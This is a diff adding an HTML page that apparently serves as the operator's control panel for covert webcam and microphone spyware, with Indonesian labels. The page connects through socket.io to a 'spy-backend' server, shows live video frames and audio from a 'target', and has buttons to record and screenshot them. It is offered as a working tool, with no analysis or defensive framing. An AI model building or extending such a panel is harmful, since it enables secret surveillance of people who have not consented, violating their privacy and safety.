@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DASHBOARD</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            background:#0d1117;
+            color:#00ff41;
+            font-family:monospace;
+            padding:20px;
+            min-height:100vh;
+        }
+        .header{text-align:center;border-bottom:2px solid #00ff41;padding-bottom:15px;margin-bottom:20px}
+        .header h1{font-size:20px}
+        .panel{
+            border:1px solid #00ff4155;
+            border-radius:8px;
+            padding:20px;
+            background:#161b22;
+            max-width:700px;
+            margin:0 auto;
+        }
+        canvas{
+            width:100%;
+            border:1px solid #00ff41;
+            background:#000;
+        }
+        .status{text-align:center;margin:10px 0;font-size:13px}
+        .dot{
+            display:inline-block;
+            width:8px;height:8px;
+            background:#00ff41;
+            border-radius:50%;
+            animation:blink 1s infinite;
+        }
+        @keyframes blink{50%{opacity:0}}
+        button{
+            background:#00ff41;
+            color:#000;
+            border:none;
+            padding:10px;
+            margin:5px;
+            cursor:pointer;
+            font-weight:bold;
+            width:48%;
+            font-family:monospace;
+        }
+        .stop{background:#f33;color:#fff}
+        audio{width:100%;margin-top:10px}
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>👨🏼‍💻 DASHBOARD</h1>
+        <p style="font-size:12px;margin-top:5px">Live Surveillance</p>
+    </div>
+    
+    <div class="panel">
+        <h3 style="margin-bottom:10px">📷 Kamera Target</h3>
+        <canvas id="canvas" width="640" height="480"></canvas>
+        <audio id="audio" autoplay controls></audio>
+        <p class="status" id="status"><span class="dot"></span> Menunggu target...</p>
+        <button onclick="startRecord()">🔴 Record</button>
+        <button class="stop" onclick="stopRecord()">⏹ Stop</button>
+        <button onclick="capture()" style="width:100%;margin-top:5px">📸 Screenshot</button>
+    </div>
+
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script>
+        // GANTI URL INI
+        const BACKEND_URL = "https://spy-backend-xxx.railway.app";
+        const socket = io(BACKEND_URL);
+        
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const audioCtx = new AudioContext();
+        let mediaRecorder, chunks = [];
+
+        socket.on('video-frame',(data)=>{
+            const img = new Image();
+            img.onload = ()=>{
+                ctx.drawImage(img,0,0,canvas.width,canvas.height);
+                document.getElementById('status').innerHTML = '<span class="dot"></span> LIVE';
+            };
+            img.src = data.frame;
+        });
+
+        socket.on('audio-data',(data)=>{
+            const buffer = audioCtx.createBuffer(1,data.samples.length,44100);
+            const channel = buffer.getChannelData(0);
+            for(let i=0;i<data.samples.length;i++) channel[i]=data.samples[i];
+            const source = audioCtx.createBufferSource();
+            source.buffer = buffer;
+            source.connect(audioCtx.destination);
+            source.start();
+        });
+
+        function startRecord(){
+            const stream = canvas.captureStream(30);
+            chunks = [];
+            mediaRecorder = new MediaRecorder(stream,{mimeType:'video/webm'});
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = ()=>{
+                const blob = new Blob(chunks,{type:'video/webm'});
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = `record_${Date.now()}.webm`;
+                a.click();
+            };
+            mediaRecorder.start();
+        }
+
+        function stopRecord(){
+            if(mediaRecorder?.state==='recording') mediaRecorder.stop();
+        }
+
+        function capture(){
+            const a = document.createElement('a');
+            a.download = `ss_${Date.now()}.png`;
+            a.href = canvas.toDataURL('image/png');
+            a.click();
+        }
+
+        socket.on('connect',()=>socket.emit('register-viewer'));
+    </script>
+</body>
+</html>
